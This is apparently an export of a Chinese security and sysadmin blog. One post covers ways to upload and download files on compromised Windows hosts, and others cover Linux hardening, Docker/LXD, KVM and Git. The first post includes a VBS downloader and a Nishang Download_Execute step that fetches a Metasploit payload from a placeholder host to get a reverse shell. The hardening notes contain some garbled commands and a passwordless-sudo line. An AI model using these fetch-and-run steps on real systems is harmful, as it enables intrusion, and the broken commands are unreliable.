color=red> 上传和下载</font>\n>对于不能上传Shell，但是可以执行命令的Windows服务器，可在shell环境中进行上传下载操作\n\n#### 1.利用FTP上传文件\n在本地或vps搭建FTP服务器\n\n常用FTP命令\n```bash\nopen 192.168.0.10    # 连接服务器\ncd <目录>\nlcd <文件夹路径>    # 定位本地文件夹(上传文件的位置或者下载文件的保存位置)\ntype    # 查看的当前的传输方式(默认是ASCII码传输)\nascii    # 设置传输方式为ascii（传输txt等）\nbinary    # 设置传输方式为二进制传输（传输exe图片视频声音等）\nclose        # 结束与服务器的FTP对话\nquit    # 结束与服务器的FTP对话并推出FTP环境\nput <文件名> [newname]    # 上传，如果不指定newname，就为原名字\nsend <文件名> [newname]    # 上传，如果不指定newname，就为原名字\nget <文件名> [newname]    # 下载，如果不指定newname，就为原名字\nmget filename [filename]  # 下载多个文件。支持空格和\"?\"两个通配符（比如: mget .mp3 表示下载FTP服务器当前目录下拓展名为mp3的文件）\n\n```\n\n\n#### 2. 利用VBS上传文件\n主要是是使用`msxm12.xmlhttp`和`adoab.stream`\n\n上传\n```vbs\n\n```\n\n下载\n```vba\n//把下面的命令以此保存到文件（比如 echo \"xxxxxxx\" >> download.vbs）\nSet Post = CreateObject(\"Msxm12.XMLHTTP\");\nSet Shell = CreateObject(\"Wscript.Shell\");\nPost.Open \"GET\",\"http://xxxx/target.exe\"\nPost.Send();\nSet aGet = CreateObject(\"ADODB.Stream\");\naGet.Mode = 3\naGet.Type = 1\naGet.Open()\naGet.Write(Post.responseBody);\naGet.SaveToFile \"C:\\\\test\\target.exe\",2\n\n\n//保存为download.vbs后，然后执行下面的命令\ncscript download.vbs\n\n```\n\n#### 3. 利用Debug上传\n**原理：**将需要上传的exe文件转换为16进制hex形式，再通过echo命令将hex代码写入文件，最后利用Debug功能将hex代码编译并还原为exe文件\n\n```bash\n# exe2bat.exe 只支持<64KB的文件，方法也较古老\n# kali中，exe2bat.exe位于/usr/share/windows-binaries目录下。\n# 1.在该目录下执行如下命令，把需要上传的ew.exe文件转换成hex形式\nwine exe2bat.exe ew.exe ew.txt        # 这里，测试ew.exe代理工具\n\n# 2.然后把上面生成的文本内容复制，echo到目标系统的某个空文件。依次执行命令，生成1.dll, 123.hex, ew.exe\ncopy 1.dll ew.exe\n\n```\n\n\n#### 4. 利用Nishang上传\n\n```bash\n# nishang中的脚本：Download_Execute    --> 常用来下载文本文件并将其转为exe文件\n\n#1. 先echo 方法把脚本内容传到目标机器，并将扩展名改为ps1\n\n#2. 利用nishang中的exetotext.ps1脚本将msf生成的msf.exe修改为文本文件msf.txt\n.\\ExetoText c:\\msf.exe c:\\msf.txt\n\n#3. 调用Download_Execute来下载并执行该文件\nDownload_Execute http://xxxxxx/msf.txt\n\n#4. 回到msf的监听窗口，可以看到反弹的shell\n\n```\n\n\n#### 5. 利用bitsadmin下载\n命令行工具(win xp之后自带的工具)， 通常同于创建下载和上传进程并检测其进展\n\n如果渗透的目标主机使用了网站代理，并且需要活动目录证书，那么bitsadmin可以帮助解决下载文件的问题\nNote：bitsadmin不支持HTTPS和FTP协议，也不支持 win xp/ server 2003及以前的版本\n\n\n#### 6. 利用PowerShell下载\n```bash\nDownload()\nDownloadString()\n。。。\n```\n\n\n>整理了一天，越整越乱，头都大了，下次理清了再来优化\n\n\n","tags":["隧道技术"],"categories":["渗透测试"]},{"title":"Linux安全加固(初级)","url":"%2Fposts%2F55264%2F","content":"  \n# Linux安全加固\n\n#### 一、安装和升级\n使用custom自定义安装,不必要的软件包尽量不装,如有必要给lilo/grub引导器加入口令限制, 安装完成后使用up2date或是apt(Debian)升级系统软件, 有时升级内核也是必要的。\n编辑 `/etc/sudoers` 添加下面内容` test1 ALL=NOPASSWD:ALL`\n\n\n#### 二、帐号安全\n1、一般服务器都是放在IDC机房,需要通过远程访问进行管理,要限制root的远程访问,管理\n员通过普通帐号远程登录,然后su到root,开发人员只使用普通帐号权限。\n\n1)  在`/etc/default/login` 文件,增加一行设置命令: `CONSOLE = /dev/tty01`\n\n2) 可以通过下面的脚本禁止对控制台的访问: \n```bash\n#! /bin/sh \ncd /etc/pam.d \nfor i in * do\n    sed '/[^#].*pam_console.so/s/^/#/' foo && mv foo $I \ndone\n```\n\n3)  通过下面的措施可以防止任何人都可以su为root,在/etc/pam.d/su中添加如下两行。\n```bash\nauth sufficient /lib/security/$ISA/pam_rootok.so debug =\nauth required /lib/security/$ISA/pam_wheel.so group=wheel\n```\n然后把您想要执行su成为root的用户放入wheel组: `usermod -G10 admin`\n\n2、编辑`/etc/securetty`, 注释掉所有允许root远程登录的控制台, 然后禁止使用所有的控制台程\n序,  其命令如下:\n```bash\nrm -f /etc/security/console.apps/servicename\n```\n\n#### 三、最少服务原则\n采用最少服务原则, `凡是不需要的服务一律注释掉`。在`/etc/inetd.conf`中不需要的服务前加\"#\", 较高版本中已经没有inetd, 而换成了Xinetd; 取消开机自动运行服务, 把`/etc/rc.d/rc3.d`下不需要运行的肥务的第一个字母\"S\"改成\"K\",其他不变.\n\n#### 四、文件系统权限\n1) 找出系统中所有含s\"位的程序,把不必要的\"s\"位去掉, 或者把根本不用的直接删除, 这样可以防止用户滥用及提升权限的可能性,其命令如下:\n```bash\nfind / -type f -perm -4000 -o -perm -2000 -print | xargs ls -lg\n```\n\n2) 把重要文件加上不可改变属性(一般情况不用这么做): \n```bash\nchattr +i /etc/passwd\n```\n`Immutable`, 系统不允许对这个文件进行任何的修改。如果目录具有这个属性, 那么任何的进程只能修改目录之下的文件,不允许建立和删除文件。\n\n3) 找出系统中没有属主的文件: `find / -nouser -o -nogroup`\n\n4) 找出任何都有写权限的文件和目录:\n```bash\nfind / -type f -perm -2 -o -perm -20 |xagrs ls -lg find / -type d -perm -2 -o -perm -20 |xagrs ls -ldg\n```\n5)ftp的上传目录不能给与执行权限, 如提供可运行CGI的虚拟主机服务, 应该做额外安全配置.\n编辑`/etc/security/limits.conf`, 加入或改变如下行:  \n```bash\nhard core 0 hard rss 5000 hard nproc 20\n```\n\n\n#### 五.Banner伪装\n1)入侵者通常通过操作系统、服务及应用程序版本来攻击, 漏洞列表和攻击程也是按此来分类, 所以我们有必要作点手脚来加大入侵的难度。所以编辑`/etc/rc.d/rc.local`如下:\n```bash\necho \"Kernel $(uname -r) on $a $(uname -m)\" >/etc/issue echo \"Kernel \\r on an \\m\" >>\n/etc/issue cp -f /etc/issue /etc/issue.net echo >> /etc/issue\n```\n\n2)对于Apache的配置文件,找到`ServerTokens`和`ServerSignature`两个directive,修改其默认属性\n如下,使用不回显版本号: \n```bash\nServerTokens prod ServerSignature Off\n```\n\n\n#### 六、IPTABLES防火墙规则:\n```bash\niptables -A INPUT -p --dport 22 -j ACCEPT\niptables -A INPUT -i eth0 -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A\nINPUT -j DROP\n```\n以上规则将阻止由内而外的TCP主动选接。\n上面是一个简单例子,IPTABLES功能十分强大, 可以根据具体情况设置防火墙规则。\n\n\n#### 七、tripwire\n`tripwire`是一个比较有名的工具,它能帮你`判断出一些重要系统文件是否被修改过`。现在的Linux发行版中一般部带有该工具的开源版本,在默认的校验对象配置文件中加入一些敏感文件就可以使用。\n\n#### 八.自行扫描\n普通的安全加固基本上是做完了,我们可以自己做一个风险评估 ,推荐使用`nessus`或其他工具。\n\n#### 九.日志策略\n主要就是创建对人侵相关的重要日志的硬拷贝, 不致于应急响应的时候连最后的黑匣子都没有。可以把它们重定向到`打印机`, `管理员邮件`, `独立的日志服务器`及其`热备份`。\n\n\n#### 十.Snort入侵检测系统\n对人侵响应和安全日志要求较高的系统有此必要；对于一般的系统而言, 如果管理员根本不会去看一大堆日志, 那么它白白占用系统资源, 就如同鸡肋一样。\n对Linux平台下病毒的防范总结出以下几条建议, 仅供参考:\n```\n(1) 做好系统加固工作。\n(2) 留心安全公告,及时修正漏洞。\n(3) 日常操作不要使用root权限进行。\n(4) 不要随便安装来历不明的各种设备驱动程序。\n(5) 不要在重要的服务器上运行一些来历不明的可执行程序或脚本。\n(6) 尽量安装防毒软件,并定期升级病毒代码库。\n(7) 对于连接到Internet的Linux服务器,要定期检测Linux病毒、蠕虫和木马是否存在。\n(8) 对于提供文件服务的Linux服务器,最好部署一款可以同时查杀Windows和Linux病毒的软件。\n(9) 对于提供邮件服务的Linux服务器,最好配合使用一个E-mail病毒扫描器。\n```\n\n总而言之，对于Linux平台下病毒的防范要采取多种手段，决不可因为现在Linux病毒很少就掉以轻心。\n\n\n\n> 有些配置文件可能已经过时了，可以根据自己的系统继续加固，未完待续... ...\n> 参考的某个资料，但是找不到原文链接了\n\n","tags":["安全加固"],"categories":["Linux"]},{"title":"ubuntu server-容器","url":"%2Fposts%2F25260%2F","content":"\n\n\n# 容器\n>有了新武器，并不表示旧武器没有用\n\n**题外话**\n\n<img src=\"http://image.xpshuai.cn/20200510223525320_174889579.png\" />\n\n**容器**\n\n<img src=\"http://image.xpshuai.cn/20200510225525049_1760370298.png\" />\n\nSDN -> 软件定义网络\n\n容器 -> 基于操作系统内核，共享宿主机的CPU\n        -> 操作系统的进程之间进行隔离\n        -> 安全性比虚拟机差一些\n         -> 可移植性\n\n**什么是容器**\n有个感性的认识即可，现在还没有明确的统一定义，根据不同产品具体理解\n\n<img src=\"http://image.xpshuai.cn/20200510230949837_2077847896.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200510231620776_117992917.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200511102236109_1751941655.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200511103008352_761812684.png\" />\n\n#### 常见的容器技术\n**Docker vs LXD/LXC**\n\n<img src=\"http://image.xpshuai.cn/20200511103208058_29787066.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200511103734465_306114851.png\" />\n\n不同容器的程序的pid可以相同\n\n<img src=\"http://image.xpshuai.cn/20200511104628559_66294885.png\" />\n\n越狱\n\n\n\n\n\n#### Docker\n> 应用程序方面的容器\n\n\n\n<img src=\"http://image.xpshuai.cn/20200511104948809_1439233734.png\" />\n\n\nDocker引擎只可以直接运行在Linux系统上\n```bash\n利用'Boot2Docker'等适配器帮助，使用轻量级'Linux vm'可在mac和微软系统上运行\n```\n\n###### 安装Docker引擎(两种方法)\n```bash\nuname -m    # 仅64位系统保障(但32位系统可用)\n\n##### 第一种办法：直接从ubuntu软件包安装(比较旧), 已经有一个老版本ubuntu包名为docker，\nsudo apt install docker.io\nsystemctl status docker\n\n# 将当前用户加入docker组(不用sudo了)\nsudo usermod -aG docker ${USER}\n# 重启\n\n\n\n\n\n##### 第二种办法：\n# 安装依赖包\nudo apt-get install apt-transport-https ca-certificates  curl software-properties-common\n# 添加docker官方GPG key(防止伪造,供应链攻击)\nurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\n# 添加docker官方库更新源\nsudo add-apt-repository  \"deb [arch=amd64] https://download.docker.com/linux/ubuntu  $(lsb_release -cs) stable\"\n# 安装\nsudo apt update\nsudo apt-get install docker-ce  # 社区版本\n```\n\n客户端工具: `docker`\n\n\n###### 基本命令\n```bash\n# 查看信息\ndocker version\ndocker info   # 查看运行了几个容器\n# Registry: 应用程序的仓库(基本linux映像，)\n\n\n# 搜索镜像(有官方有个人的: 用户名/容器名) --> 建议下载官方的image然后自己打造容器\ndocker search apache2\n\n# 下载镜像\ndocker pull hello-world\n# 下载时候指定-a（会下载所有版本）\ndocker pull hello-world -a\n\n# 查看镜像\ndocker images \n\n# 运行容器\ndocker run busybox echo \"hello\"\n\n# 删除image\ndocker rmi busybox:1-musl\n\n```\n\n\n###### Docker基本概念\n**Docker 映像**\n- 组成应用程序运行所需的全部文件合集\n- 只读/读写 `分层`结构(每次对映像的修改都通过commit形成一个新层)\n- `容器层` 是基于映像`可读写`的顶层\n- `映像层`所有的Docker映像都源自于一个`基础镜像`(Debian/Ubuntu)  --> 只读，不可修改i\n- 其他的功能模块附加于基础影像形成最终程序\n\n\n\n<img src=\"http://image.xpshuai.cn/20200511111809612_1403827030.png\" />\n\n- Docker images 是构建Docker container的基础\n\n- Docker 层/容器层\n\n  <img src=\"http://image.xpshuai.cn/20200511112309748_1071300544.png\" />\n\n每个映像有唯一的ID(SHA256/  取前6字节来显示)\n```bash\ndocker images\n# 可看到唯一的image id\n# TAG:  默认是最新版本(latest)   \n\ndocker images --no-trunc\n# 可以看到完整的SHA256完整的字节\n```\n\n**Docker容器**\nimages是只读的，在基础上创建并运行容器(可读写)\n```bash\n# 查看运行的容器（每个容器都有唯一的id）\ndocker ps    # 不显示关闭的容器\ndocker ps -a  # 显示所有状态的容器\n#显示字段： 有容器id, 基于image的名字，command, 容器创建时间， status, ports, names(随机生成的,可以改)\n\n\n# 基于image运行容器(每次运行一次都产生一个新的容器!)\ndocker run busybox echo \"hello\"\ndocker run busybox:1-uclibc echo \"hello\"  # 指定标签来用哪个(如果本机没有，会自动pull)\n\n# \ndocker run -i -t busybox:ubuntu-16.04 \n\n\n# 删除容器\ndocker stop d751d48a6d0a  # 如果运行了先stop掉\ndocker rm d751d48a6d0a\n\n```\n\n\npull的时候，默认会去一个人url地址寻找镜像\n\nDocker Resigtry相当于目录，Repository相当于具体文件位置\n\n可以自建映像库\n\n<img src=\"http://image.xpshuai.cn/20200511143726490_328609255.png\" />\n\n\n\n\n\n###### Docker使用\n基本命令\n```bash\n# 运行镜像后交互登录入容器（这里基于ubuntu）\n# --name  修改容器的默认名字，指定\ndocker run --name xxx01 -it ubuntu /bin/bash\n# 退出\nexit /   ctrl + D\n\n# 退出容器终端，但退出不关闭容器\nctrl + P , ctrl + Q   # 组合\n\n# 启动容器\ndocker start id_id_id\n\n# 继续进入正在运行的容器\ndocker attach xxx01\n\n# 重命名容器\ndocker rename 453dsdaojp test01\n\n# 容器与镜像对比变化\ndocker diff 453dsdaojp test02\n- C:修改了\n- A:增加了\n- D:删除了\n\n\n\n### 日常管理命令\ndocker start 453dsdaojp\ndocker restart 453dsdaojp\ndocker stop 453dsdaojp\ndocker rename 453dsdaojp\ndocker pause 453dsdaojp    # 挂起\ndocker unpause 453dsdaojp  # 恢复\n```\n\n\n创建映像\n```bash\ndocker run -it ubuntu /bin/bash    \n....    # 进入容器进行一些了修改\nctrl + p, ctrl + q\ndocker commit test01 xps/test:0.1  # 创建了新的image\n# 然后可以上传到docker Resigtry\n# 后面就跟别的image一样使用可以创建容器等\n```\n\n后台运行容器\n```bash\n# 不进入交互方式的shell\ndocker run -d ubuntu /bin/bash -c \"while true; sleep 3; do date\";done  \n```\n\n查看日志\n```bash\ndocker logs 453dsdaojp\n```\n\n\n**实例**\n```bash\n# 配置一个apache，并可以外部访问\ndocker run -dit -p 8080:80 ubuntu /bin/bash  # 端口映射(外部:容器端口)\ndocker attach doasdkop463fd    # 进入容器\napt update && apt install apache2  # 正常操作\n/etc/init.d/apache2 start\nctrl+p, ctrl+Q\n# 宿主机浏览器访问 http://宿主机ip:8080\n\n\n## 服务自动启动(或者手动把下面内容输入进去)\necho '/etc/init.d/apache2 start' >> /etc/bash/rc\n\n## 基于配置好的容器创建新的镜像\ndocker commit ubuntu xps/apache1:0.1  # 创建了新的image\n# 打包好之后上传到hub，就可以正常下载和使用image了\n```\n\n\n\n\n###### Dockerfiles\n>前面的下载，制作，上传，再下载的方法也挺麻烦的\n\n使用Dockerfile自动创建映像（Dockerfile文本文件，包含创建容器的指令）\n\n这里还是以apacha2为例\n1.先写配置文件\n```bash\n# vim Dockerfile\nFROM ubuntu     # 从官方下载镜像\nMAINTAINER xps <xps@admin.com>\nRUN apt update; apt dist-upgrade -y\nRUN apt install -y apache2 vim\nRUN echo '/etc/init.d/apache2 start' >> /etc/bash/rc\n```\n2.基于dockerfile来创建容器\n```bash\n# 标签自己定义即可, 最后的点(.) 表示当前目录下的dockerfile\ndocker build -t test/apache-server:1.0 .\n\n# 然后run创建启动容器\ndocker run -dit -p 8080:80 test/apache-server:1.0 /bin/bash\n```\n\n>PS: 更深入的Dockerfile知识再另外学\n\n\n\n\n\n\n#### LXD\n特点\n```\n- lxd 新部署容器过程比Docker更容易\n- 退出容器时不必以特定的方式退出\n- lxd 容器中没有层的概念\n- Docker中的层可以使部署更快(没有清理也可能感觉混乱)\n```\n\n\n安装\n```bash\n# snap适用所有发行版本\nsudo snap install lxd    # sudo apt install lxd    # ubuntu官方包apt一般中不会是最新的软件包\nsudo usermod -aG lxd ${USER}    # 当前用户加入lxd组，就具有管理权限了\n# 重启主机\n```\n\n初始化\n```bash\nlxd init\n\n# 回答问题(默认即可)\n\n```\n\n运行容器\n```bash\n# 创建容器\nlxc launch ubuntu:18.04 C01 # C01是容器名称\n# 自动从远程服务器下载映像并创建、运行容器(从国外下载，速度稍微慢)\n\n# - lxd命令针对lxd管理层\n# - 容器管理命令仍然使用lxc\n```\n\n常用管理命令\n```bash\nlxc list  # 列出所有的容器\nlxc start c_name  # 启动容器\nlxc stop c_name   # 停止容器\nlxc delete c_name # 删除容器\n\nlxc image list    # 查看镜像\nlxc image delete  # 删除镜像\n\n```\n\n交互登录容器\n```bash\n# 执行某个容器的什么命令\nlxc exec C01 bash    # root帐号登录\nlxc exec C01  -- sudo --login --user ubuntu    # ubuntu镜像包含一个默认账户ubuntu\n# 在本地终端直接执行容器内部的命令\nlxc exec C01 -- apt update\n\n# 退出容器(容器依然是run的状态)\nctrl+D / exit\n```\n\n随宿主机的启动, 自动启动某个容器\n```bash\nlxc config set C01 boot.autostart 1\n```\n\n远程映像存储服务器\n```bash\n# 列出远程映像存储服务器\nlxc remote list    # 默认三个\n\n- images         # 存储其他Linux发行版镜像\n- ubuntu         # ubuntu自己正式发布的系统镜像\n- ubuntu-daily   # ubuntu自己的非正式的系统镜像(每天更新的)\n```\n\n从远程复制映像\n```bash\nlxc launch images:debian/stretch test01\n# 只下载映像到本地，不创建容器\nlxc image copy ubuntu-daily:18.10 local: --alias u1910\nlxc image list    # 查看本地的映像\n\n# 从本地映像来创建容器\nlxc launch u1910 c03\n# 查看本地容器\nlxc list\n```\n\n\n对容器进行上传下载文件\n```bash\n# 直接在宿主机器上执行\nlxc file pull c01/etc/hosts . # 把文件下载到当前目录\nlxc file push hosts c01/tmp/  # 上传文件到容器中路径\n\n# 当然，也可以进入交互shell复制  lxc exec C01 bash\n```\n\n\n映像自动更新间隔(小时)\n```bash\n# 每隔24小时自动更新映像\nlxc config set images.auto_update_interval 24\n```\n\n\n自动清除未使用的映像(天数)\n```bash\nlxc config ser images.remote_cache_expiry 5\n```\n\n查看配置\n```bash\nlxc config show\n```\n\n\n实例\n```bash\n# 安装apache2\nlxc exec c01 bash\napt update && apt install apache2\nip addr show\ncurl 1.1.1.1\n\n```\n\n外部网络对容器内部访问\n```bash\n- 防火墙规则路由流量\n- 创建配置我呢见DHCP 获取物理网络地址(类似VM)\n- 宿主机创建桥接网卡 br0\n```\n","tags":["LXD"],"categories":["Linux"]},{"title":"ubuntu server-虚拟化","url":"%2Fposts%2F64674%2F","content":"\n## <font color=red> 云计算 </font>\n>资源就像水龙头里的水，按需索取\n\n\n**信息时代计算资源是最主要的生产力**\n- 主机时代、网络时代\n- 集中和分散、三十年河东三十年河西\n- 量子计算可能颠覆一切\n\n\n**计算资源的云化**\n- 按需调度、按需索取\n- 计算资源需要更大程度的颗粒度细化\n- `虚拟化`是计算资源细分的`基础`\n\n\n**处理器运算能力的大幅提升**\n- 处理速度月来越快（摩尔定律）\n- 多核处理器架构\n- 大量计算资源限制浪费，企业整体运行成本高\n- 多应用同机部署，应用隔离差，稳定性影响大\n- 处理器支持虚拟化技术\n\n\n###### 分类\n**1.Saas：** Software as a Service\n```bash\n# 软件即服务， 服务以软件形式交付\nGmail / Google Docs / 在线Office / Office 365 ...\n无需本地安装部署\n```\n\n**2.PaaS：** Platform as a Service\n```bash\n# 平台即服务\n提供软件开发运行的基础平台\nAPI、Google App Engine\n```\n\n**3.IaaS：** Infrastructure as a Service\n```bash\n# 基础架构即服务\n最底层的晕计算，物理的计算、存储、网络资源饭各位你\nAWS、Google Computer Engine、 阿里云\n```\n\n\n云计算是将资源打碎、分配、发布、交付的一组工具的合集\n\nHypervisors -> 使得虚拟服务器的性能不依赖物理机，和物理机是平行的，可以直接访问物理的CPU\n```bash\n# 常见的虚拟化软件\nKVM、XEN(目前部署方式是完整的光盘)、QEMU、Virtualbox、VMWare\n# 本章主要学这两个：KVM、EMU\n```\n\n云计算平台\n```bash\n# ubuntu上最典型的\nOpenstack\n\n```\n服务编排工具\n```\n# 典型的\nJuju\n```\n\n机器配置工具\n```\nMAAS\n```\n\n\n## <font color=red> 虚拟化 </font>\n物理服务器，部署虚拟化平台，创建多个虚拟机，每个虚拟机使用物理机的计算量。虚拟化是云计算的基础\n\n- 降低成本，提高利用率，方便管理部署，快速恢复还原\n- 普遍用于开发测试实验、生产环境部署都可\n- 需要硬件支持(BIOS设置开启)\n- CPU特性 Hypervision\n\n\n### KVM\n**Kernel-based Virtual Machine（KVM）**\n\n- 基于内核的虚拟机(KVM)和快速仿真器(QEMU)组成的虚拟化套件( QEMU/KVM )\n- QEMU/KVM在没有硬件虚拟化支持下，虚拟机需要运行在QEMU模拟器中\n- 有硬件虚拟化支持下，**接近硬件物理机速度运行**\n- 虚拟化扩展决定性能( virtualization extensions )\n- Ubuntu默认内建支持的虚拟化方案\n- 内建于Linux内核( Intel 的kvm-intel.ko或AMD的kvm-amd.ko )\n- libvirt库是Linux与虚拟化通信的统一 接口\n- 处理在主机和客户机之间分离任务所需的低级指令\n- **无法并行运行VirtualBox和KVM虛拟机**，它们会抢占CPU的虚拟化功能\n\n把`KVM`和`QEMU`结合在一起\n通过`libvirt`库实现Linux与虚拟化通信的接口\n\n\n\n**验证硬件平台支持虚拟化拓展(较新的硬件全部支持)**\n四种方法\n```bash\n# F1\negrep -c '(vmx|svm)' /proc/cpuinfo  # 结果不为0即支持\nerep -E 'vmx|svm' /proc/cpuinfo  # 结果不为0即支持\n\n\n# F2 \nkvm-ok\n# sudo apt install cpu-checker\n\n\n# F3\nlscpu\n# 找下列字段：\n# Virtualization: VT-x\n# Flags: vmx\n\n\n# F4  \nsudo virt-host-validate\n# sudo apt install libvirt-client\n# Checking for hardware virtualizatin: PASS\n\n可以在virtualbox或vmware虚拟机里面安装kvm的虚拟机\n```\n\n\n#### KVM安装和使用\n##### 安装服务端组件\n```bash\n# bridge-utils桥接的防止，用来做地址转换的\nsudo apt install bridge-utils libvirt-bin qemu-kvm qemu-system\n# 当前用户会被加入livirt组\n# 需要重启系统使得权限生效\n\n\n# 映像文件目录(以后的虚拟机文件都会放在这里)\n/var/lib/libcirt/images\n# 配置文件\n/etc/libvirt/libvirtd.conf\n权限(读写,管理)的修改，加密证书等。一般不需要配置。\n```\n\n##### 安装客户端组件\n###### 1.图形化的客户端管理工具\n```bash\n# 1.图形化的管理工具(virt-manager)，ssh-askpass是用来ssh连接远程主机使用的\nsudo apt install virt-manager ssh-askpass \n\n# 客户端的使用\n可以新建连接：选择连接哪个机器(本机、远程机器)的kvm后台\n创建虚拟机:跟virtualbox的就类似了，Add Pool指定iso文件的路径来挂载寻找\n\n\n# 2.也有字符界面的客户端管理工具\n```\n\n\n\n**网卡桥接配置**\n默认虚拟机网络模式为NAT（可以访问外部网络，但外部计算机无法访问虚拟机），可以使用`网桥`实现VM被外部网络访问\n\n<img src=\"http://image.xpshuai.cn/20200510211152045_955020812.png\" />\n\n网桥的配置\n```bash\n# sudo vim /etc/netplan/50-cloud-init.yaml\n# 新增配置\nethernets:\n    ens33:\n        dhcp4: no    # 这个分给网桥，所以这个物理网卡不能有ip地址\n        dhcp6: no\n    bridegs:    # 配置网桥\n        br0:\n          interfaces: [ens33]\n          dhcp4: no\n          addresses: [172.16.24.13/24]\n          gatewat4: 172.16.24.1\n          nameservers:\n            addresses: [8.8.8.8,8.8.4.4]\n    \n\n# 让配置生效\nsudo netplan apply\n```\n\n虚拟机配置：选择虚拟机，选择第二个窗口，选择网卡，Bridge模式，选择设备，启动虚拟机\n\n\n建立连接\n```bash\nvirt-manager 本机/ 网络 连接\nvirt-manager 基本使用\n```\n\n克隆创建虚拟机\n```bash\nKVM不支持模板功能，但可将虚拟机关机作为模板使用(右键，clone, 基于它作为\"模板\")\n# 创建虚拟机快，占资源少\n```\n\n\n虚拟机管理控制台（有很多好用的功能）\n\n\n**迁移(Migrate) **--> 把某宿主机上(出现故障了)某台虚拟机迁移到另一台安装了kvm服务的服务器上\n\n\n\n###### 2.命令行客户端\n> 命令行方便写脚本，·批量进行很多虚拟机的安装和管理\n\n创建虚拟机\n```bash\n# 命令行创建虚拟机 virt-install\nsudo virt-install -n web1 -r 2048 --disk path=/var/lib/libcire/images/web1.img,bus=virtio,size=10 -c ubuntu-18.04-server-amd64.iso --newwork newtork=default,model=virtio --graphics vnc, listen=0.0.0.0 --noautoconsele -v\n\n# --disk path   虚拟机镜像文件存放路径\n# size=4        硬盘文件大小4G\n# bus=virtio    总线类型\n# -c            CDROM（iso文件、物理光驱）\n# --newwork newtork=default，model=virtio   接口模式\n# --graphics vnc, listen=0.0.0.0        VNC控制接口\n# --noautoconsele    不自动连接虚拟机控制台\n```\n\n复制虚拟机\n```bash\nsudo virt-clone -o win10 -n win10-2 -f /var/lib/libcire/images/win10-2.img\n# -o    原始虚拟机\n# -n    新建虚拟机\n# -f    虚拟机镜像文件存放路径\n```\n\n\n建立连接\n```bash\nvirsh connect qemu:///192.168.0.12\n```\n\n查看vm服务器上所有VM\n```bash\n#  查看run的\nvirsh list\n\n# 查看所有状态的\nvirsh list --all\n```\n\n管理VM\n```bash\nvirsh console centos_01\n```\n\n关闭当前console\n```bash\nctrl + ]\n```\n\n正常关机\n```bash\nvirsh shutdown centos_01\n```\n\n强制关机\n```bash\nvirsh destory centos_01\n```\n\n删除虚拟机\n```bash\nvirsh undefine centos_01\n```\n\n挂起VM\n```bash\nvirsh suspend centos_01\n```\n\n恢复使用VM\n```bash\nvirsh resume centos_01\n```\n\n\n\n\n\n#### 使用云平台\n\n下载适合不同环境的镜像: https://cloud-images.ubuntu.com/releases/bionic/release\n```bash\nwget /ubuntu-18.04-server-cloudimg-amd64.img  -O u18.img.dist\n```\n\n解压下载的镜像文件\n```bash\nqemu-img convert -O qcow2 u18.img.dist u18.img\n\n# 不能直接使用，可以理解这个为一个模板\n```\n\n创建用户数据文件\n```bash\nvim cloud-config\n\n# cloud-config\npasswdor: 123465\nchpasswd: { expire: Flase }  # 密码不过期\nssh_pwauth: True    # 允许ssh身份认证\n```\n\n生成用户数据盘\n```bash\n# 基于模板创建一个新的数据盘\ncloud-localds user-data.img cloud-config  # 使用上面的配置文件\n```\n\n启动虚拟机\n```bash\nkvm -m 2048 -smp 2 -hda u18.img -hdb user-data.img -net nic -net user,hostfwd=tcp::1810-:22 -nographic\n\n# 帐号密码: ubuntu / 123465(上面配置文件指定的)\nsudo passwd ubuntu     # 修改密码\n```\n\n删除云镜像初始化脚本\n```bash\nsudo apt-get remove cloud-init\n```\n\n使用云镜像创建VM\n\n\n部署完一个之后，就可以基于第一个进行clone\n\n","tags":["虚拟化"],"categories":["Linux"]},{"title":"ubuntu server-版本控制","url":"%2Fposts%2F52930%2F","content":"\n  \n# 107-版本控制\n\n## 概述\n#### 简介\nversion control system（版本控制系统）\nrevision control system (修订控制系统)\n\n- 开发工具，但不仅限于源码文件\n- 记录文件的每次变更\n- 随时可以回到历史状态\n- 文件以及元数据的变更（修改人、修改理由、具体修改内容、时间戳）\n- 配置文件是除数据之外第二大资产\n- 团队写作\n\n\n#### 分类\n- Centralized version control systems (SVCS) 集中式版本控制\n    - 集中存储修改，颗粒控制细，但是单点故障隐患\n    - CSV / Subersion\n\n- distributed  version control systems (DVCS) 分布式版本控制\n    - 分布式存储库的完整拷贝\n    - Git / Mercurial  / Bazaar(Ubuntu官方在开发时候使用的)\n    - 每个人维护本地库，完成后上传到服务器\n\n指针指向当前最新版本\n随着回滚还原历史版本\n\n\n\n## Git\n- 最初由Linux内核创始人开发\n- Git作为开发工具而生\n- 适合大型项目的版本管理\n- Git库保存所有程序员的团队成果\n- Git默认使用OpenSSH\n- 服务器上的Git用户需要能够修改目录(库)\n- 一个库就是一个文件夹(库配置信息: `.git`目录)\n- 无需独立的专职服务器，满足存储空间需求可共用\n- github目前世界上最大的代码托管服务商（已被微软收购）\n\n\n\n#### 服务端\n**安装**\n```bash\n# 1. ubuntu自带的(和git自带的版本不一样,不是最新的)\n# sudo -s    把自己提升成root权限，后面就不用输入sudo了\napt install git \n\nmkdir /git    # 创建一个文件夹(后续作为一些git库的存放位置)\nchown xps:xps /git\ncd /git\ngit init --bare apache2    # 创建一个裸库,名字叫apache2（空的框架库，不存在数据）\n\n/var/log/auth.log    # ssh登录问题诊断\n\n\n\n# 2.使用ppa库方式安装\nsudo add-apt-repository ppa:git-core/ppa\nsudo apt update\nsudo apt install git\ngit version    # 版本比ubuntu库中的新\n\n然后和上面一样创建存放git库的目录\n```\n\n\n#### 客户端\n使用\n```bash\n# 客户端和服务端都是安装的同一个git软件包\n# 其实客户端本身也可以作为一个本地的git服务器\n\n# 基本配置\ngit config --global user.name \"Your Name\"\ngit config --global user.email \"eamail@domain.com\"\ngit config --list    # 查看配置信息\n\ngit help    # 查看常用的git二级命令\ngit help -a    # 查看所有的子命令\ngit help -g    # 查看所有的子命令, 并有描述\ngit help everyday    # man giteveryday  查看具体某一个子命令的用法\n\n```\n\ngit客户端连接服务器\n```bash\nmkdir /git    # 同样创建一个文件夹\nchown xps:xps /git\ncd /git\n\n# 作为客户端，从远程服务端clone库(是服务端的绝对路径)\ngit clone xps@192.168.0.105:/git/web\n\n\n# 